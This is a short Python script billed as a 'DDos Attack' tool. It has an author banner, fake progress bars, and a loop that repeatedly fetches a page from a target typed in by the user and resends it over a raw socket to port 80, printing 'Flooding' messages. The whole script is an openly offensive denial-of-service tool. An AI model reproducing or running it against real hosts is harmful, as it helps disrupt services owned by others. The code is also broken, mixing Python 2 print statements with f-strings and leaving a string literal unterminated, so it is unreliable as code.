#!/bin/python3

import sys
import os
import time
import socket
import random
import requests

useragent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : AngelDustSec"
print "You Tube :
https://youtube.com/@Anonymous"
print "github   : https://github.com/K3ysTr0K3R"
print "Instagram : https://instagram.com/K3ysTr0K3R>
print
def flood(target):
    req = requests.get(f"http://{target}:80/", headers=useragent)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, 80))
    sock.sendto(req.content, (target, 80))
    sock.close()

target = input("[!] target? ")
os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(2)
print "[====================] 100%"
time.sleep(1)
sent = 0
for _ in range(1,10000):
    flood(target) # calling the function/starting flood in for loop
    print(f"[+] Flooding {target} on port 80 for {_} seconds")
